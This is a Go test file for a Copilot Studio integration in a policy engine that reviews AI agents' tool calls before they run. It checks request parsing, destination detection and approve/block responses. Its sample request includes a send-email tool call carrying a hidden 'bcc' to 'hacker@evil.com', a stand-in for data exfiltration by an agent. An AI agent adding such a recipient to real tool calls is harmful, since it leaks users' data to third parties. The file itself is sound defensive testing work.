package copilot

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/obot-platform/obot/pkg/provenance"
)

const (
	// documentedRequest is the example from Microsoft's developer documentation
	// for the analyze-tool-execution endpoint (api-version 2025-05-01).
	documentedRequest = `{
  "plannerContext": {
    "userMessage": "Send an email to the customer",
    "thought": "User wants to notify customer",
    "chatHistory": [
      {"id": "m1", "role": "user", "content": "Send an email to the customer", "timestamp": "2025-05-25T08:00:00Z"},
      {"id": "m2", "role": "assistant", "content": "Which customer should I email?", "timestamp": "2025-05-25T08:00:01Z"},
      {"id": "m3", "role": "user", "content": "The customer is John Doe", "timestamp": "2025-05-25T08:00:02Z"}
    ],
    "previousToolOutputs": [
      {
        "toolId": "tool-123",
        "toolName": "Get customer email by name",
        "outputs": {"name": "email", "description": "Customer's email address", "type": {"$kind": "String"}, "value": "customer@foobar.com"},
        "timestamp": "2025-05-25T08:00:02Z"
      }
    ]
  },
  "toolDefinition": {
    "id": "tool-123",
    "type": "PrebuiltToolDefinition",
    "name": "Send email",
    "description": "Sends an email to specified recipients.",
    "inputParameters": [{"name": "to", "description": "Receiver of the email", "type": {"$kind": "String"}}],
    "outputParameters": [{"name": "result", "description": "Result", "type": {"$kind": "String"}}]
  },
  "inputValues": {"to": "customer@foobar.com", "bcc": "hacker@evil.com"},
  "conversationMetadata": {
    "agent": {"id": "agent-guid", "tenantId": "tenant-guid", "environmentId": "env-guid", "isPublished": true},
    "user": {"id": "user-guid", "tenantId": "tenant-guid"},
    "trigger": {"id": "trigger-guid", "schemaName": "trigger-schema"},
    "conversationId": "conv-id",
    "planId": "plan-guid",
    "planStepId": "step-1",
    "futureField": {"ignored": true}
  }
}`
)

type fakeEngine struct {
	approved []string
}

func (f fakeEngine) ToolCapabilities(_ context.Context, server, tool, description string) provenance.Labels {
	return provenance.ToolCapabilityHeuristics(server, tool, description)
}

func (f fakeEngine) IsExternal(_ context.Context, host string) bool {
	return !provenance.HostMatches(host, f.approved)
}

func TestParseDocumentedShape(t *testing.T) {
	var r Request
	if err := json.Unmarshal([]byte(documentedRequest), &r); err != nil {
		t.Fatal(err)
	}
	if r.ConversationID != "conv-id" || r.PlanID != "plan-guid" || r.PlanStepID != "step-1" {
		t.Fatalf("conversation metadata: %+v", r)
	}
	if r.AgentID != "agent-guid" || r.TenantID != "tenant-guid" || r.EnvironmentID != "env-guid" || r.UserID != "user-guid" {
		t.Fatalf("agent/user metadata: %+v", r)
	}
	if r.Prompt != "Send an email to the customer" || r.Thought != "User wants to notify customer" {
		t.Fatalf("planner context: %+v", r)
	}
	if len(r.History) != 3 || r.History[1].Role != "assistant" || r.History[2].Content != "The customer is John Doe" {
		t.Fatalf("history: %+v", r.History)
	}
	if len(r.ToolOutputs) != 1 || r.ToolOutputs[0].ToolName != "Get customer email by name" || r.ToolOutputs[0].Content != "email: customer@foobar.com" {
		t.Fatalf("tool outputs: %+v", r.ToolOutputs)
	}
	if len(r.Actions) != 1 {
		t.Fatalf("actions: %+v", r.Actions)
	}
	a := r.Actions[0]
	if a.ID != "tool-123" || a.Type != "PrebuiltToolDefinition" || a.Name != "Send email" || a.Description != "Sends an email to specified recipients." {
		t.Fatalf("action: %+v", a)
	}
	if a.Inputs["to"] != "customer@foobar.com" || a.Inputs["bcc"] != "hacker@evil.com" {
		t.Fatalf("inputs: %+v", a.Inputs)
	}
}

func TestParseAliases(t *testing.T) {
	for _, tc := range []struct {
		name string
		body string
		want Request
	}{
		{
			name: "snake case and a plan array",
			body: `{"conversation_id":"c2","tenant_id":"t1","bot_id":"b1","agent_name":"Expense bot","user_principal_name":"ada@example.com",
				"query":"file my expenses",
				"history":[{"role":"User","content":"hi"},{"role":"tool","name":"lookup","content":{"total":12}}],
				"plan":[{"toolName":"post_message","connector":"slack","inputs":{"channel":"#x"}},{"actionName":"create_row","parameters":{"table":"expenses"}}]}`,
			want: Request{
				ConversationID: "c2",
				TenantID:       "t1",
				AgentID:        "b1",
				AgentName:      "Expense bot",
				UserEmail:      "ada@example.com",
				Prompt:         "file my expenses",
				History: []Message{
					{Role: "user", Content: "hi"},
					{Role: "tool", Name: "lookup", Content: "total: 12"},
				},
				Actions: []PlanAction{
					{Name: "post_message", Connector: "slack", Inputs: map[string]any{"channel": "#x"}},
					{Name: "create_row", Inputs: map[string]any{"table": "expenses"}},
				},
			},
		},
		{
			name: "session id, prompt, nested plan steps and numeric ids",
			body: `{"sessionId":"s3","agentId":7,"prompt":"go","plan":{"steps":[{"id":"step-a","type":"Connector","connector":{"name":"github"},"input":"not an object"}]},
				"previousToolsOutputs":[{"toolName":"search","outputs":[{"name":"a","value":"x"},{"name":"b","value":{"nested":true}}]}]}`,
			want: Request{
				ConversationID: "s3",
				AgentID:        "7",
				Prompt:         "go",
				ToolOutputs:    []ToolOutput{{ToolName: "search", Content: "a: x\nb: nested: true"}},
				Actions:        []PlanAction{{ID: "step-a", Type: "Connector", Name: "step-a", Connector: "github", Inputs: map[string]any{"input": "not an object"}}},
			},
		},
		{
			name: "empty",
			body: `{}`,
			want: Request{},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var got Request
			if err := json.Unmarshal([]byte(tc.body), &got); err != nil {
				t.Fatal(err)
			}
			got.Raw = nil
			gotJSON, _ := json.Marshal(got)
			wantJSON, _ := json.Marshal(tc.want)
			if string(gotJSON) != string(wantJSON) {
				t.Fatalf("got  %s\nwant %s", gotJSON, wantJSON)
			}
		})
	}
}

func TestBuildActionsAndSubject(t *testing.T) {
	var r Request
	if err := json.Unmarshal([]byte(documentedRequest), &r); err != nil {
		t.Fatal(err)
	}
	ctx := t.Context()
	actions := BuildActions(ctx, fakeEngine{approved: []string{"foobar.com"}}, &r)
	if len(actions) != 1 {
		t.Fatalf("actions: %+v", actions)
	}
	a := actions[0]
	if a.Surface != provenance.SurfaceCopilot || a.Kind != provenance.KindToolCall || a.Tool != "Send email" || a.Server != "agent-guid" {
		t.Fatalf("action identity: %+v", a)
	}
	if !a.Capabilities.Has(provenance.CapWritesExternal) || !a.Sink.Writes {
		t.Fatalf("send email should write externally: %+v", a)
	}
	// The first email address in the inputs is the destination; foobar.com is approved.
	if a.Sink.Destination != "foobar.com" || a.Sink.External {
		t.Fatalf("sink should be refined by the approved destination: %+v", a.Sink)
	}
	if a.Arguments["bcc"] != "hacker@evil.com" {
		t.Fatalf("arguments must carry the inputs: %+v", a.Arguments)
	}

	external := BuildActions(ctx, fakeEngine{}, &r)[0]
	if !external.Sink.External {
		t.Fatalf("with no approved destinations the sink is external: %+v", external.Sink)
	}

	// A reading tool with an address in its inputs is not an external write.
	r.Actions = []PlanAction{{Name: "Get customer by id", Description: "Looks up a customer record", Inputs: map[string]any{"contact": "ada@customer.example"}}}
	lookup := BuildActions(ctx, fakeEngine{}, &r)[0]
	if lookup.Sink.External || lookup.Sink.Writes || lookup.Sink.Destination != "customer.example" {
		t.Fatalf("lookup sink: %+v", lookup.Sink)
	}

	subject := Subject(&r, "42")
	if subject.UserID != "42" || subject.Actor.Agent != Agent || subject.Actor.ClientSessionID != "conv-id" {
		t.Fatalf("subject: %+v", subject)
	}
	if strings.Join(subject.Actor.Delegation, ",") != "entra:user-guid,copilot_studio:agent-guid" {
		t.Fatalf("delegation: %v", subject.Actor.Delegation)
	}
	key := Session(&r)
	if key.LinkKey() != "client:copilot_studio:conv-id" {
		t.Fatalf("session key: %+v", key)
	}
	if got := ResolveUserID(ctx, nil, &r); got != "" {
		t.Fatalf("no resolver should give no user, got %q", got)
	}
	resolver := func(_ context.Context, oid, email string) (string, error) {
		if oid == "user-guid" && email == "" {
			return "42", nil
		}
		return "", nil
	}
	if got := ResolveUserID(ctx, resolver, &r); got != "42" {
		t.Fatalf("resolver should map the Entra user, got %q", got)
	}
}

func TestDestination(t *testing.T) {
	for _, tc := range []struct {
		name   string
		inputs map[string]any
		want   string
	}{
		{
			name:   "url wins over email",
			inputs: map[string]any{"to": "a@b.example", "url": "https://Paste.example/upload?x=1"},
			want:   "paste.example",
		},
		{
			name:   "email domain",
			inputs: map[string]any{"recipients": []any{"ada@customer.example"}},
			want:   "customer.example",
		},
		{
			name:   "nothing",
			inputs: map[string]any{"text": "hello"},
			want:   "",
		},
		{
			name:   "empty",
			inputs: nil,
			want:   "",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := Destination(tc.inputs); got != tc.want {
				t.Fatalf("got %q, want %q", got, tc.want)
			}
		})
	}
}

func TestResultResponse(t *testing.T) {
	approve := Result{Actions: []ActionDecision{{Name: "a", Decision: DecisionApprove}}}.Response()
	if approve.BlockAction || approve.Reason != "" || approve.ReasonCode != 0 || !strings.Contains(approve.Diagnostics, `"decision":"approve"`) {
		t.Fatalf("approve: %+v", approve)
	}
	block := Result{Actions: []ActionDecision{
		{Name: "a", Decision: DecisionApprove},
		{Name: "b", Decision: DecisionBlock, Effect: provenance.EffectRequireApproval, Reason: "held"},
		{Name: "c", Decision: DecisionBlock, Effect: provenance.EffectDeny, Reason: "denied"},
	}}.Response()
	if !block.BlockAction || block.Reason != "held" || block.ReasonCode != ReasonCodeApprovalRequired {
		t.Fatalf("block: %+v", block)
	}
	killed := Result{Actions: []ActionDecision{{Decision: DecisionBlock, Killed: true}}}.Response()
	if killed.ReasonCode != ReasonCodeKilled {
		t.Fatalf("killed: %+v", killed)
	}
	timedOut := Result{TimedOut: true}.Response()
	if timedOut.BlockAction || timedOut.Reason != "decision timed out" {
		t.Fatalf("timed out: %+v", timedOut)
	}
}

func TestDedupeAndSummary(t *testing.T) {
	d := NewDedupe(4)
	if d.Seen("c", "tool", "x") || !d.Seen("c", "tool", "x") || d.Seen("other", "tool", "x") || d.Seen("c", "prompt", "x") {
		t.Fatal("dedupe is scoped by conversation and kind")
	}
	for i := range 10 {
		d.Seen("c", "tool", string(rune('a'+i)))
	}
	if len(d.seen) > 4 || len(d.order) != len(d.seen) {
		t.Fatalf("dedupe must stay bounded: %d entries", len(d.seen))
	}
	if got := Summary("  send   the\nreport "); got != "send the report" {
		t.Fatalf("summary: %q", got)
	}
	if got := Summary(strings.Repeat("word ", 40)); len([]rune(got)) != 80 || !strings.HasSuffix(got, "...") {
		t.Fatalf("summary should be 80 runes: %q", got)
	}
}
